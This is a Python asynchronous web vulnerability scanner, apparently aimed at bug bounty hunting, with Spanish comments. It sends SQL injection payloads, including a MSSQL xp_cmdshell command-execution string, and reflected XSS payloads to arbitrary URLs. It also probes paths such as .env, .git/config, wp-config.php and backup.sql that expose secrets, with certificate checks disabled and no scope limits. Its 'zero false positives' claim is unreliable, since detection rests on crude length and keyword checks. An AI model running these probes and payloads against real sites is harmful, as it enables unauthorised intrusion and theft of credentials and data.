#!/usr/bin/env python3
"""
VULN SCANNER v4.0 - Bug Bounty Edition
Zero false positives · Máxima velocidad
"""

import aiohttp
import asyncio
import re
from urllib.parse import urljoin, urlparse

class VulnScanner:
    def __init__(self, base_url, aggressive=False):
        self.base_url = base_url.rstrip('/')
        self.aggressive = aggressive
        self.vulns = []
        self.session = None
        
        # Payloads letales para bug bounty
        self.sqli_payloads = [
            ("' OR '1'='1", "mysql"),
            ("' UNION SELECT NULL--", "union"),
            ("' AND SLEEP(5)--", "time"),
            ("'; exec xp_cmdshell 'whoami'--", "mssql"),
            ("' OR pg_sleep(5)--", "postgres")
        ]
        
        self.xss_payloads = [
            ("<script>alert(1)</script>", "reflected"),
            ("\"><script>alert(1)</script>", "attribute"),
            ("javascript:alert(1)", "uri"),
            ("onload=alert(1)", "event"),
            ("<img src=x onerror=alert(1)>", "image")
        ]
        
        self.paths_criticos = [
            '.env', '.git/config', 'api/swagger.json', 'graphql',
            'wp-config.php', 'backup.sql', 'database.sql',
            'phpinfo.php', 'info.php', 'server-status',
            'actuator/health', 'actuator/env', 'swagger-ui.html'
        ]
        
    async def verify_vuln(self, url, original_response, payload, vuln_type):
        """Verifica que no sea falso positivo"""
        try:
            async with self.session.get(url, timeout=10, ssl=False) as resp:
                new_response = await resp.text()
                
                # SQLi verification
                if vuln_type == 'sqli':
                    if len(new_response) != len(original_response):
                        if "error" in new_response.lower() or "mysql" in new_response.lower():
                            return True
                            
                # XSS verification
                elif vuln_type == 'xss':
                    if payload.replace('<', '&lt;') not in new_response:
                        if payload in new_response:
                            return True
                            
                return False
        except:
            return False
            
    async def scan_sqli(self, url, param='id'):
        """SQL Injection con verificación"""
        try:
            # Baseline
            async with self.session.get(url, timeout=10, ssl=False) as resp:
                baseline = await resp.text()
                
            for payload, db_type in self.sqli_payloads:
                test_url = f"{url}?{param}={payload}"
                async with self.session.get(test_url, timeout=10, ssl=False) as resp:
                    text = await resp.text()
                    
                    # Detección rápida
                    if len(text) != len(baseline):
                        if await self.verify_vuln(test_url, baseline, payload, 'sqli'):
                            return {
                                'type': 'SQLi',
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'db_type': db_type,
                                'severity': 'CRITICO'
                            }
        except:
            pass
        return None
        
    async def scan_xss(self, url, param='q'):
        """XSS con verificación"""
        try:
            for payload, xss_type in self.xss_payloads:
                test_url = f"{url}?{param}={payload}"
                async with self.session.get(test_url, timeout=10, ssl=False) as resp:
                    text = await resp.text()
                    
                    if payload in text:
                        # Verificar que no está escapado
                        if payload.replace('<', '&lt;') not in text:
                            return {
                                'type': 'XSS',
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'xss_type': xss_type,
                                'severity': 'MEDIO'
                            }
        except:
            pass
        return None
        
    async def run(self):
        """Ejecutar escaneo bug bounty"""
        print(f"\n[XSS] BUG BOUNTY SCANNER - {self.base_url}")
        print("=" * 60)
        
        self.session = aiohttp.ClientSession()
        
        try:
            # 1. Paths críticos (rápido)
            print("[*] Buscando paths sensibles...")
            tasks = []
            for path in self.paths_criticos:
                url = urljoin(self.base_url, path)
                tasks.append(self.session.get(url, timeout=5, ssl=False))
                
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            for i, resp in enumerate(responses):
                if isinstance(resp, aiohttp.ClientResponse) and resp.status == 200:
                    path = self.paths_criticos[i]
                    content = await resp.text()
                    
                    if 'sql' in content or 'DB' in content:
                        sev = 'CRITICO'
                    else:
                        sev = 'ALTO'
                        
                    self.vulns.append({
                        'type': 'SENSITIVE_PATH',
                        'path': path,
                        'url': urljoin(self.base_url, path),
                        'severity': sev
                    })
                    print(f"   [[CRITICO]] {path} expuesto")
                    
            # 2. SQLi en endpoints comunes (si aggressive)
            if self.aggressive:
                print("\n[*] Probando SQL Injection...")
                endpoints = ['', 'index.php', 'api/users', 'products']
                for endpoint in endpoints:
                    url = f"{self.base_url}/{endpoint}".rstrip('/')
                    result = await self.scan_sqli(url)
                    if result:
                        self.vulns.append(result)
                        print(f"   [[CRITICO]] SQLi encontrada en {endpoint}")
                        
            # 3. XSS en parámetros comunes
            print("\n[*] Probando XSS...")
            params = ['q', 's', 'search', 'query', 'id', 'page']
            for param in params:
                result = await self.scan_xss(self.base_url, param)
                if result:
                    self.vulns.append(result)
                    print(f"   [[WARN]] XSS encontrado en parámetro {param}")
                    
        finally:
            await self.session.close()
            
        # Mostrar resumen
        print("\n" + "="*60)
        print("📊 VULNERABILIDADES ENCONTRADAS")
        print("="*60)
        
        criticos = [v for v in self.vulns if v['severity'] == 'CRITICO']
        altos = [v for v in self.vulns if v['severity'] == 'ALTO']
        
        if criticos:
            print(f"\n[CRITICO] CRÍTICOS ({len(criticos)}):")
            for v in criticos:
                print(f"   • {v['type']}: {v.get('path', v.get('url', ''))}")
                
        if altos:
            print(f"\n[WARN]  ALTOS ({len(altos)}):")
            for v in altos:
                print(f"   • {v['type']}")
                
        print(f"\n[OK] Total: {len(self.vulns)}")
        
        return self.vulns
